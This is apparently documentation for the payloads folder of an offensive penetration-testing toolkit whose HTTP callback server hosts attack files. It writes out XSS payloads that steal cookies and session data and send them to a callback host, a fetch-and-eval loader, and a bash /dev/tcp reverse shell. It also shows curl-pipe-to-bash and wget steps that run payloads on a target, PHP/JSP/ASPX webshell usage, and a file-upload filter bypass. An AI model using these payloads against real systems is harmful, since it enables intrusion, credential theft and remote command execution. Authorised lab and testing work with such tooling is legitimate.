Payloads
========

The ``payloads/`` directory stores files that will be served by the HTTP callback server. All files are automatically accessible via HTTP.

Directory Structure
-------------------

.. code-block:: text

   payloads/
   ├── xss/           # XSS payloads and JavaScript
   ├── shells/        # Reverse shells and webshells
   ├── exploits/      # Compiled exploits or binaries
   └── files/         # Miscellaneous files

Access via HTTP Server
----------------------

When you start the server with ``uv run your_project --server``, files in the ``payloads/`` directory are accessible at:

- ``http://[your-ip]:8000/payloads/[filename]``
- ``http://[your-ip]:8000/static/[filename]`` (alias)

Examples
~~~~~~~~

**Place files:**

.. code-block:: text

   payloads/xss/steal-cookie.js
   payloads/shells/reverse.py
   payloads/exploits/privesc.bin

**Access them:**

.. code-block:: text

   http://10.10.14.5:8000/payloads/xss/steal-cookie.js
   http://10.10.14.5:8000/payloads/shells/reverse.py
   http://10.10.14.5:8000/payloads/exploits/privesc.bin

Included Payloads
-----------------

XSS Payloads
~~~~~~~~~~~~

Located in ``payloads/xss/``:

**examples.txt**
  Ready-to-use XSS payloads for copy-paste

**steal-cookie.js**
  JavaScript cookie stealer that sends cookies to your callback server

**steal-all.js**
  Comprehensive data exfiltration (cookies, localStorage, session data, DOM content)

Example XSS payload:

.. code-block:: html

   <img src=x onerror="fetch('http://your-ip:8000/xss?c='+btoa(document.cookie))">

Or load external script:

.. code-block:: html

   <script src="http://your-ip:8000/payloads/xss/steal-cookie.js"></script>

Webshells
~~~~~~~~~

Located in ``payloads/shells/``:

**cmd.php**
  PHP command execution shell

**cmd.jsp**
  Java/JSP command execution shell

**cmd.aspx**
  .NET/IIS command execution shell

All webshells use the same simple interface:

.. code-block:: python

   import requests

   # Execute command via webshell
   resp = requests.get("http://target/cmd.jsp?cmd=whoami")
   print(resp.text)  # Output: nt authority\system

   # Works identically across platforms
   requests.get("http://target/cmd.php?cmd=id")
   requests.get("http://target/cmd.aspx?cmd=whoami")

Common Use Cases
----------------

Serving Exploit Binaries
~~~~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: bash

   # 1. Place your compiled exploit
   cp privesc.elf payloads/exploits/

   # 2. Start server
   uv run your_project --server --lhost 10.10.14.5

   # 3. Download on target
   wget http://10.10.14.5:8000/payloads/exploits/privesc.elf
   chmod +x privesc.elf

Hosting Reverse Shell Scripts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

.. code-block:: bash

   # 1. Generate shell payload
   echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > payloads/shells/rev.sh

   # 2. Start server
   uv run your_project --server --lhost 10.10.14.5

   # 3. Execute on target
   curl http://10.10.14.5:8000/payloads/shells/rev.sh | bash

Or use the built-in shell generators:

.. code-block:: python

   from your_project.utils.reverse_shells import bash_shell

   # Generates shell script in payloads/shells/
   path = bash_shell("10.10.14.5", 4444)
   print(f"Shell available at: http://10.10.14.5:8000/{path}")

XSS Data Exfiltration
~~~~~~~~~~~~~~~~~~~~~

.. code-block:: javascript

   // In your XSS payload
   fetch('http://attacker:8000/payloads/xss/steal-all.js')
     .then(r => r.text())
     .then(eval);

The server will:

1. Serve the JavaScript file
2. Log when it's loaded
3. Receive and log the exfiltrated data
4. Store everything in ``logs/server.ndjson``

File Upload Payloads
~~~~~~~~~~~~~~~~~~~~

Place uploaded webshells in payloads for easy management:

.. code-block:: python

   from your_project.utils.file_upload import FileUploader

   # Upload a shell
   uploader = FileUploader(f"{target}/upload")
   shell_path = "payloads/shells/cmd.php"

   with open(shell_path, 'rb') as f:
       result = uploader.upload_with_bypass(
           "shell.php",
           f.read(),
           techniques=["double_extension", "null_byte"]
       )

   if result['success']:
       # Access the uploaded shell
       requests.get(f"{target}/uploads/shell.php?cmd=whoami")
